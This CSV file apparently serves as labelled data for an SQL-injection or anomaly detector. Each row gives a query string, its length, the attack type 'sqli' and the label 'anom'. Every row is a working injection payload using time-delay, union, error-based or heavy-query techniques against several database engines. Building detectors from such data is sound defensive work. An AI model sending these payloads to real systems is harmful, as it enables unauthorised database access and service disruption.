Query,Length,Attack,Label
1%' and (select * from (select(sleep(5)))fzno) and '%'=',56,sqli,anom
"1') where 9091=9091 union all select null,null,null,null#",57,sqli,anom
"1) where 6340=6340 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",123,sqli,anom
"1%';iif(6369=5881,1,1/0)",24,sqli,anom
1'))) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((('mfmk'='mfmk,257,sqli,anom
"1'qhfy<'"">utwq",14,sqli,anom
"1%'))) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",158,sqli,anom
"1%"")));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",103,sqli,anom
"1'+(select immd where 7499=7499 union all select null,null,null,null,null,null,null,null#",89,sqli,anom
1 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq'),95,sqli,anom
"-9031%"") order by 1--",21,sqli,anom
"1' or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and 'ozur'='ozur",93,sqli,anom
1'))) and 6969=(select 6969 from pg_sleep(5)) and ((('ineq' like 'ineq,70,sqli,anom
"1 where 7642=7642 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--",93,sqli,anom
"-3007) where 6648=6648 union all select 6648,6648,6648,6648,6648,6648,6648,6648#",80,sqli,anom
"1%"";select case when 7717=7717 then 1 else null end--",53,sqli,anom
1%'))) and 8594=(select 8594 from pg_sleep(5))--,48,sqli,anom
"1"" where 2452=2452;select sleep(5)#",35,sqli,anom
"1' or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and 'wwwb'='wwwb",189,sqli,anom
-9327') or 3038=3038,20,sqli,anom
"-3035"") union all select 7912,7912,7912#",40,sqli,anom
"1'));select benchmark(5000000,md5(0x714e4153))#",47,sqli,anom
1%')) or 6793=(select 6793 from pg_sleep(5)) and (('%'=',56,sqli,anom
"1"";select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ""kndm""=""kndm",78,sqli,anom
1'))) order by 1#,17,sqli,anom
1 where 8966=8966;if(1087=5839) select 1087 else drop function zzeh--,69,sqli,anom
"-7088'||(select 'arol' from dual where 8891=8891 union all select 8891,8891,8891,8891,8891,8891,8891,8891#",106,sqli,anom
"-2054%""))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""%""=""",203,sqli,anom
1'+(select 'xqjx' where 7048=7048 and 9198=9198--,49,sqli,anom
"1"")));call regexp_substring(repeat(right(char(2385),0),500000000),null)--",73,sqli,anom
"1%';call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and '%'='",112,sqli,anom
"1'+(select 'ggkm' where 3394=3394;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",101,sqli,anom
1) as fhvb where 4008=4008;begin user_lock.sleep(5); end--,58,sqli,anom
"1')) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('swjk'='swjk",162,sqli,anom
"1')) as anaq where 9605=9605 and elt(4249=4249,7259)--",54,sqli,anom
"1') or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",79,sqli,anom
"1'))) union all select null,null,null,null#",43,sqli,anom
1)) and 9198=9198--,19,sqli,anom
"1%"" and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ""%""=""",74,sqli,anom
"1%""))) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",114,sqli,anom
"1') or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)",77,sqli,anom
"1"") where 7957=7957 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--",82,sqli,anom
"1%"") and 2388=benchmark(5000000,md5(0x6d457153))#",49,sqli,anom
"-6659') where 1256=1256 union all select 1256,1256--",52,sqli,anom
-2050' union all select 5606#,29,sqli,anom
"1%"");select case when 7717=7717 then 1 else null end--",54,sqli,anom
1' in boolean mode) or 6793=(select 6793 from pg_sleep(5))#,59,sqli,anom
"-8256""))) or 6872=6872 and (((""lrtu""=""lrtu",42,sqli,anom
"1'||(select 'mwmn' where 5112=5112 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a))||'",208,sqli,anom
"1"")));select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",89,sqli,anom
"1) as wuio where 5312=5312 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",133,sqli,anom
"1"")) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",112,sqli,anom
"1"") or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and (""cdnc"" like ""cdnc",115,sqli,anom
"1"")));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (((""khuw"" like ""khuw",116,sqli,anom
"1%') union all select null,null,null,null,null,null,null#",57,sqli,anom
"1%') and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ('%'='",121,sqli,anom
1' or 6793=(select 6793 from pg_sleep(5)) and 'hokd'='hokd,58,sqli,anom
"1"" where 1537=1537 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",191,sqli,anom
"1%"");begin dbms_lock.sleep(5); end--",36,sqli,anom
"1'||(select 'ycya' from dual where 3536=3536 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",107,sqli,anom
"1"") as wvxt where 7321=7321 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",103,sqli,anom
"1) as idvt where 3490=3490 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",125,sqli,anom
1))) rlike (select * from (select(sleep(5)))sgvo) and (((4574=4574,66,sqli,anom
"1""))) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",146,sqli,anom
1')) as vdhw where 8858=8858 order by 1#,40,sqli,anom
"-3710)) union all select 5770,5770,5770,5770,5770,5770,5770#",60,sqli,anom
"1"") and sleep(5)#",17,sqli,anom
"(select (case when (1938=1938) then dbms_pipe.receive_message(chr(118)||chr(118)||chr(112)||chr(76),5) else 1938 end) from dual)",128,sqli,anom
1')) or (select * from (select(sleep(5)))ydpu) and (('ytxg'='ytxg,65,sqli,anom
"1"") and elt(4249=4249,7259) and (""xgka"" like ""xgka",50,sqli,anom
1';select (case when (8642=6049) then 1 else 8642*(select 8642 from master..sysdatabases) end)--,96,sqli,anom
"-4012"") or make_set(9354=9354,7185) and (""ccfn""=""ccfn",53,sqli,anom
"1' or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)",102,sqli,anom
1' where 9242=9242;begin dbms_lock.sleep(5); end--,50,sqli,anom
"-4947' in boolean mode) union all select 3314,3314#",51,sqli,anom
1'))) and (3020=3020)*6703 and ((('qfxg'='qfxg,46,sqli,anom
-1492 where 2788=2788 union all select 2788#,44,sqli,anom
"1) as khkv where 2944=2944 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",199,sqli,anom
"1' union all select null,null,null,null,null,null,null,null,null,null#",70,sqli,anom
1'+(select mfcd where 6757=6757 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))+',233,sqli,anom
"-6363"") where 4043=4043 union all select 4043,4043,4043,4043,4043,4043,4043,4043,4043--",87,sqli,anom
"-5062""))) union all select 4125,4125--",38,sqli,anom
"-9451""))) union all select 4211,4211,4211,4211,4211,4211,4211--",63,sqli,anom
-7279) or 9898=9963 and (1481=1481,34,sqli,anom
1)) as oqui where 3368=3368 order by 1--,40,sqli,anom
"1' where 2025=2025 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",126,sqli,anom
"1%')(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ('%'='",212,sqli,anom
1'))) waitfor delay '0:0:5'--,29,sqli,anom
1%'))) or (select * from (select(sleep(5)))ydpu) and ((('%'=',61,sqli,anom
"1%"")) or elt(5873=5873,sleep(5))#",33,sqli,anom
"1' and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and 'ccsb'='ccsb",116,sqli,anom
"-1212%') or make_set(7588=2306,2306) and ('%'='",47,sqli,anom
"1"" where 2394=2394 and 8831=8333--",34,sqli,anom
"1'));select count(*) from generate_series(1,5000000) and (('jloi'='jloi",71,sqli,anom
1'||(select 'bifa' where 6077=6077 and 4547=9301,48,sqli,anom
"1"")));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (((""zlal""=""zlal",140,sqli,anom
"1"") union all select null,null,null,null,null,null,null,null,null,null--",72,sqli,anom
1)) as izvy where 2569=2569;begin user_lock.sleep(5); end--,59,sqli,anom
"1') as vpop where 2528=2528 union all select null,null,null,null,null,null,null#",80,sqli,anom
"1')));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ((('squj'='squj",115,sqli,anom
-7624') or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ('iwab'='iwab,118,sqli,anom
1)));select (case when (2830=7046) then 2830 else cast(1 as int)/(select 0 from dual) end) from dual--,102,sqli,anom
"1%"")) rlike sleep(5) and ((""%""=""",32,sqli,anom
"1%""))) union all select null,null,null,null,null,null,null,null,null#",69,sqli,anom
-7199' or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and 'qibr'='qibr,254,sqli,anom
-8665' or 6825=7840 and 'vbsy' like 'vbsy,41,sqli,anom
1')) as kdse where 6767=6767 rlike sleep(5)#,44,sqli,anom
"-3462)) as biyl where 5143=5143 union all select 5143,5143,5143--",65,sqli,anom
1%'));(select * from (select(sleep(5)))acdk)#,45,sqli,anom
"1')) as xjen where 6791=6791 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",134,sqli,anom
"1';call regexp_substring(repeat(right(char(3702),0),500000000),null) and 'rfgj' like 'rfgj",90,sqli,anom
"1') and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",111,sqli,anom
"1')));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",102,sqli,anom
1'+(select 'sbji' where 7989=7989 rlike (select * from (select(sleep(5)))sgvo))+',81,sqli,anom
1';select pg_sleep(5)--,23,sqli,anom
"1%"") and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",107,sqli,anom
"1' in boolean mode);select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5#",106,sqli,anom
"1"") where 2445=2445;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",111,sqli,anom
"1%"";select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",100,sqli,anom
1%'));select (case when (3444=8424) then 3444 else 3444*(select 3444 from information_schema.character_sets) end)#,114,sqli,anom
"1"") where 4905=4905 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",127,sqli,anom
1%'))) order by 1#,18,sqli,anom
"1)) as xzcl where 2332=2332;select benchmark(5000000,md5(0x714e4153))#",70,sqli,anom
-9742) where 8409=8409 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,210,sqli,anom
"1"") where 8462=8462 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--",113,sqli,anom
"-6405' union all select 8235,8235,8235,8235,8235#",49,sqli,anom
"-7584' union all select 1132,1132,1132,1132,1132,1132,1132,1132,1132,1132#",74,sqli,anom
1) as obzn where 7652=7652 or (select * from (select(sleep(5)))ydpu)--,70,sqli,anom
"1"";(select * from (select(sleep(5)))srmq)",41,sqli,anom
"1'||(select 'pvmz' from dual where 1090=1090 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1))||'",178,sqli,anom
"1' and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and 'lgat' like 'lgat",114,sqli,anom
"1) where 4768=4768 union all select null,null,null,null,null,null,null,null#",76,sqli,anom
-2100' where 9260=9260 or 3038=3038,35,sqli,anom
"1)) as fynx where 9636=9636 union all select null,null,null,null,null--",71,sqli,anom
"1') and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",106,sqli,anom
"1' and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and 'egye'='egye",127,sqli,anom
1' and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)),201,sqli,anom
"1' or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)",106,sqli,anom
"1%')));select * from generate_series(5206,5206,case when (5206=2214) then 1 else 0 end) limit 1--",97,sqli,anom
"1%' and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",79,sqli,anom
"1"") as gffq where 4387=4387 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--",118,sqli,anom
1'||(select 'allj' where 7334=7334;begin dbms_lock.sleep(5); end)||',68,sqli,anom
1'||(select 'sxya' where 3578=3578;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,143,sqli,anom
-3185')) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (('rknd' like 'rknd,218,sqli,anom
-4523 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))),207,sqli,anom
"-1908"") where 6420=6420 union all select 6420,6420,6420,6420--",62,sqli,anom
"1"") as saqy where 9704=9704 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--",227,sqli,anom
"1%' and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and '%'='",164,sqli,anom
-2055) or 3038=3038,19,sqli,anom
"-5379') union all select 4294,4294,4294--",41,sqli,anom
"1"" where 8234=8234;select (case when (4291=6937) then 4291 else 4291*(select 4291 from mysql.db) end)#",102,sqli,anom
"1'))) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((('ewwi'='ewwi",121,sqli,anom
"1' and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and 'kwhs' like 'kwhs",127,sqli,anom
"1'+(select 'ncny' where 5634=5634;select like('abcdefg',upper(hex(randomblob(500000000/2)))))+'",95,sqli,anom
"-6368' union all select 6529,6529,6529--",40,sqli,anom
1' where 2134=2134 rlike (select (case when (3613=2090) then 1 else 0x28 end))--,80,sqli,anom
"1' where 8837=8837 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",117,sqli,anom
1)) as skex where 7941=7941 and sleep(5)--,42,sqli,anom
"1') as sjzi where 8242=8242 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",135,sqli,anom
"1') or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ('ekqv'='ekqv",95,sqli,anom
"1') and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)",154,sqli,anom
"1%')));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",94,sqli,anom
1'+(select aqhj where 4419=4419;waitfor delay '0:0:5'--,55,sqli,anom
1') and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('yaim'='yaim,224,sqli,anom
"-7635"" union all select 1284,1284,1284,1284,1284,1284#",54,sqli,anom
"1"" or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ""ctdc""=""ctdc",112,sqli,anom
"-9439"") where 9460=9460 or (9497=9586)*9586--",45,sqli,anom
"1) where 5550=5550 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",207,sqli,anom
"-9829'))) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",140,sqli,anom
"1%""))) union all select null,null,null,null,null,null,null,null--",65,sqli,anom
1 where 2672=2672 and 1819=4322#,32,sqli,anom
"1') where 8125=8125 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",217,sqli,anom
"1'||(select 'dajl' from dual where 8440=8440;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",136,sqli,anom
1'+(select 'sfko' where 6853=6853 rlike sleep(5)#,49,sqli,anom
"1"");select (case when (4415=2051) then 4415 else cast(1 as int)/(select 0 from dual) end) from dual--",101,sqli,anom
"1"") as ubva where 6369=6369 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",123,sqli,anom
"1') or elt(5873=5873,sleep(5))#",31,sqli,anom
"1"") as qjyu where 2679=2679 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",135,sqli,anom
"1%' and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and '%'='",110,sqli,anom
"1%"";call regexp_substring(repeat(right(char(3702),0),500000000),null) and ""%""=""",79,sqli,anom
"1'+(select 'utlx' where 6256=6256 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)))+'",125,sqli,anom
1' or sleep(5)#,15,sqli,anom
1));select (case when (6002=9048) then 6002 else 6002*(select 6002 from mysql.db) end)#,87,sqli,anom
"-2745') or elt(1032=1032,3623) and ('vfxq'='vfxq",48,sqli,anom
1' and (select * from (select(sleep(5)))fzno) and 'vwve' like 'vwve,67,sqli,anom
"-2033"") or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",138,sqli,anom
"1 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)# cqqs",177,sqli,anom
"-9382') union all select 4774,4774,4774,4774--",46,sqli,anom
"1"") as xrsi where 9498=9498;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",115,sqli,anom
1')) as qpai where 2619=2619;(select * from (select(sleep(5)))acdk)#,68,sqli,anom
1'||(select 'rhcv' where 6228=6228;select (case when (3672=8360) then 3672 else 3672*(select 3672 from information_schema.character_sets) end)#,143,sqli,anom
-4248 where 3288=3288 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,254,sqli,anom
"1"";select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ""ulfr"" like ""ulfr",106,sqli,anom
1%')) union all select null#,28,sqli,anom
"1"" or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ""snht""=""snht",169,sqli,anom
"1'+(select 'jhce' where 1117=1117 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))+'",133,sqli,anom
"1"")));select benchmark(5000000,md5(0x4c4d6142)) and (((""bqfj"" like ""bqfj",72,sqli,anom
"1') and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ('plfa'='plfa",122,sqli,anom
"1')));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((('xmwj'='xmwj",107,sqli,anom
"1'+(select 'tzyz' where 4912=4912 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",95,sqli,anom
1') and 4595=4595#,18,sqli,anom
"1%"" and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ""%""=""",107,sqli,anom
"-4085'+(select aipn where 5493=5493 union all select 5493,5493,5493,5493,5493,5493,5493#",88,sqli,anom
"-3151%""))) union all select 6250,6250,6250,6250,6250,6250,6250,6250,6250,6250#",78,sqli,anom
"1"")) as dcrk where 5164=5164 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",181,sqli,anom
"-1030"" where 2161=2161 union all select 2161,2161,2161,2161,2161,2161,2161,2161,2161,2161--",91,sqli,anom
"1%'))) and 8635=(select count(*) from generate_series(1,5000000))--",67,sqli,anom
"-9133"")) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((""crfy""=""crfy",229,sqli,anom
"1'||(select 'blvu' from dual where 9813=9813;select count(*) from generate_series(1,5000000))||'",96,sqli,anom
"1' union all select null,null--",31,sqli,anom
"1"";iif(2084=5671,1,1/0)",23,sqli,anom
"1'||(select 'jmao' where 3009=3009;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",126,sqli,anom
"-6770"" or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)",192,sqli,anom
1';begin dbms_lock.sleep(5); end and 'aenf'='aenf,49,sqli,anom
-6377' or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'qcms' like 'qcms,230,sqli,anom
"-2803') as jciy where 1130=1130 or make_set(4599=6550,6550)--",61,sqli,anom
"-8629 where 8049=8049 union all select 8049,8049,8049,8049,8049,8049,8049#",74,sqli,anom
"1%') or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ('%'='",89,sqli,anom
"1"");call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (""pdqm"" like ""pdqm",125,sqli,anom
"-8491"" where 6107=6107 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--",222,sqli,anom
1 where 3502=3502 order by 1--,30,sqli,anom
"1"");select count(*) from generate_series(1,5000000) and (""kngx"" like ""kngx",74,sqli,anom
"elt(8192=8192,sleep(5))",23,sqli,anom
"1"") as upjw where 3880=3880 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",126,sqli,anom
"1) as hywx where 1424=1424 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",122,sqli,anom
1%';select case when 7717=7717 then 1 else null end--,53,sqli,anom
1));select sleep(5)#,20,sqli,anom
-9509'))) or 1091=5477 and ((('gsmz'='gsmz,42,sqli,anom
"1 where 3799=3799 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",125,sqli,anom
1) where 9683=9683;select (case when (1082=6755) then 1082 else 1082*(select 1082 from mysql.db) end)#,102,sqli,anom
"-5643')) union all select 1515,1515#",36,sqli,anom
"-2951"" or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))",204,sqli,anom
"1"" where 9618=9618 and (3020=3020)*6703--",41,sqli,anom
1'||(select 'yydv' from dual where 9639=9639;select case when 8514=3207 then 1 else null end--,94,sqli,anom
"make_set(8734=8734,sleep(5))",28,sqli,anom
1'||(select 'awba' from dual where 3749=3749 and 1445=3334--,60,sqli,anom
-8370')) or (3501=6407)*6407 and (('agcm' like 'agcm,52,sqli,anom
"-8566"") as hnch where 3418=3418 union all select 3418,3418,3418,3418,3418,3418,3418#",84,sqli,anom
"-7715') union all select 4830,4830,4830,4830,4830,4830,4830,4830--",66,sqli,anom
"1) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))",198,sqli,anom
"1))) and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",100,sqli,anom
"1))) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (((9474=9474",112,sqli,anom
1' and sleep(5),15,sqli,anom
"1""))) union all select null,null,null,null,null,null,null#",58,sqli,anom
1%');waitfor delay '0:0:5' and ('%'=',37,sqli,anom
